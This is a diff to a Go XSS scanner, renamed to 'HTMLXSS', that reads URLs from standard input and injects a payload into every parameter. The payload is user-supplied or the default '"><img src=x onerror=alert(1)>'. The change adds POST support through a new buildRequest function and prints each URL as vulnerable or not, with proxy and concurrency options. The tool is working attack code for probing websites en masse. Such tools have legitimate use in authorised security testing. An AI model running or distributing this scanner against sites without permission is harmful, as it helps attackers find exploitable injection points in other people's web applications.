@@ -2,6 +2,7 @@ package main
 
 import (
 	"bufio"
+	"bytes"
 	"crypto/tls"
 	"flag"
 	"fmt"
@@ -19,7 +20,7 @@ import (
 func init() {
 	flag.Usage = func() {
 		help := []string{
-			"Airi XSS",
+			"HTMLXSS",
 			"",
 			"Usage:",
 			"+====================================================================================+",
@@ -28,6 +29,7 @@ func init() {
 			"|       -c                    Set Concurrency, Default: 50",
 			"|       -x, --proxy,          Send traffic to a proxy",
 			"|       -s, --only-poc        Show only potentially vulnerable urls",
+			"|       -o                    HTTP Method: get or post (Default: get)",
 			"|       -h                    Show This Help Message",
 			"|",
 			"+====================================================================================+",
@@ -35,10 +37,7 @@ func init() {
 		}
 
 		fmt.Println(`
- _____ _     _
-|  _  |_|___|_|_ _ ___ ___
-|     | |  _| |_'_|_ -|_ -|
-|__|__|_|_| |_|_,_|___|___|
+HTMLXSS
 `)
 		fmt.Fprintf(os.Stderr, strings.Join(help, "\n"))
 	}
@@ -73,10 +72,19 @@ func main() {
 	flag.BoolVar(&poc, "only-poc", false, "")
 	flag.BoolVar(&poc, "s", false, "")
 
+	var method string
+	flag.StringVar(&method, "o", "get", "HTTP method: get or post")
+
 	flag.Var(&headers, "headers", "")
 	flag.Var(&headers, "H", "")
 
 	flag.Parse()
+
+	method = strings.ToLower(strings.TrimSpace(method))
+	if method != "get" && method != "post" {
+		fmt.Fprintf(os.Stderr, "[-] Método inválido: %s. Use -o get ou -o post\n", method)
+		os.Exit(1)
+	}
 
 	visto := make(map[string]bool)
 	std := bufio.NewScanner(os.Stdin)
@@ -90,9 +98,9 @@ func main() {
 			for v := range targets {
 				var output string
 				if xsspayload != "" {
-					output = xss(v, xsspayload, proxy, poc)
+					output = xss(v, xsspayload, proxy, poc, method)
 				} else {
-					output = xssDefault(v, proxy, poc)
+					output = xssDefault(v, proxy, poc, method)
 				}
 				if output != "ERROR" {
 					fmt.Println(output)
@@ -147,14 +155,53 @@ func applyHeaders(req *http.Request) {
 }
 
 func isHTMLResponse(resp *http.Response) bool {
-	contentType := resp.Header.Get("Content-Type")
-	return strings.Contains(contentType, "text/html")
+	ct := resp.Header.Get("Content-Type")
+	return strings.Contains(ct, "text/html")
 }
 
-func xss(targetURL, payload, proxy string, onlyPOC bool) string {
+// buildRequest monta o request GET ou POST injetando o payload nos parâmetros
+func buildRequest(targetURL, payload, method string) (*http.Request, string, error) {
+	u, err := url.Parse(targetURL)
+	if err != nil {
+		return nil, "", err
+	}
+
+	q, err := url.ParseQuery(u.RawQuery)
+	if err != nil {
+		return nil, "", err
+	}
+
+	// injeta payload em todos os params
+	for key := range q {
+		q.Set(key, payload)
+	}
+
+	// se não há params na URL, ainda tenta com o payload direto
+	finalURL := targetURL
+
+	if method == "post" {
+		// POST: params no body, URL sem query string
+		u.RawQuery = ""
+		body := bytes.NewBufferString(q.Encode())
+		req, err := http.NewRequest("POST", u.String(), body)
+		if err != nil {
+			return nil, "", err
+		}
+		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+		return req, u.String(), err
+	}
+
+	// GET: params na query string
+	u.RawQuery = q.Encode()
+	finalURL = u.String()
+	req, err := http.NewRequest("GET", finalURL, nil)
+	return req, finalURL, err
+}
+
+func xss(targetURL, payload, proxy string, onlyPOC bool, method string) string {
 	client := buildClient(proxy)
 
-	req, err := http.NewRequest("GET", targetURL, nil)
+	req, finalURL, err := buildRequest(targetURL, payload, method)
 	if err != nil {
 		return "ERROR"
 	}
@@ -180,36 +227,23 @@ func xss(targetURL, payload, proxy string, onlyPOC bool) string {
 
 	if onlyPOC {
 		if match {
-			return targetURL
+			return fmt.Sprintf("[%s] %s", strings.ToUpper(method), finalURL)
 		}
 		return "ERROR"
 	}
 
 	if match {
-		return "\033[1;31mVulnerable - " + targetURL + "\033[0;0m"
+		return fmt.Sprintf("\033[1;31mVulnerable [%s] - %s\033[0;0m", strings.ToUpper(method), finalURL)
 	}
-	return "\033[1;30mNot Vulnerable - " + targetURL + "\033[0;0m"
+	return fmt.Sprintf("\033[1;30mNot Vulnerable [%s] - %s\033[0;0m", strings.ToUpper(method), finalURL)
 }
 
-func xssDefault(targetURL, proxy string, onlyPOC bool) string {
+func xssDefault(targetURL, proxy string, onlyPOC bool, method string) string {
 	client := buildClient(proxy)
 
-	u, err := url.Parse(targetURL)
-	if err != nil {
-		return "ERROR"
-	}
-
 	defaultPayload := `"><img src=x onerror=alert(1)>`
-	q, err := url.ParseQuery(u.RawQuery)
-	if err != nil {
-		return "ERROR"
-	}
-	for key := range q {
-		q.Set(key, defaultPayload)
-	}
-	u.RawQuery = q.Encode()
 
-	req, err := http.NewRequest("GET", u.String(), nil)
+	req, finalURL, err := buildRequest(targetURL, defaultPayload, method)
 	if err != nil {
 		return "ERROR"
 	}
@@ -235,13 +269,13 @@ func xssDefault(targetURL, proxy string, onlyPOC bool) string {
 
 	if onlyPOC {
 		if match {
-			return u.String()
+			return fmt.Sprintf("[%s] %s", strings.ToUpper(method), finalURL)
 		}
 		return "ERROR"
 	}
 
 	if match {
-		return "\033[1;31mVulnerable - " + u.String() + "\033[0;0m"
+		return fmt.Sprintf("\033[1;31mVulnerable [%s] - %s\033[0;0m", strings.ToUpper(method), finalURL)
 	}
-	return "\033[1;30mNot Vulnerable - " + u.String() + "\033[0;0m"
+	return fmt.Sprintf("\033[1;30mNot Vulnerable [%s] - %s\033[0;0m", strings.ToUpper(method), finalURL)
 }
